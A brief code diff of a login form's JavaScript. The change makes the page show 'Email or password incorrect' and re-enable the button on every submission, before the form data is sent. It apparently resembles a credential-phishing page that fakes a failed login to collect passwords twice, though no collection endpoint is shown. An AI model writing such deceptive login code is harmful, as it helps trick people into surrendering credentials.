@@ -36,8 +36,8 @@
     }
     e.preventDefault();
 
-    u('#status').html('<center><div class="loaderclock"></div></center>');
-    u('#zigaozi').attr({disabled:true});
+    u('#status').html('<div class="errordiv">Email or password incorrect. Kindly try again with correct details.</div>');
+    u('#zigaozi').attr({disabled:false});
 
     const body = new FormData(myForm);
     u('#form').attr('action')
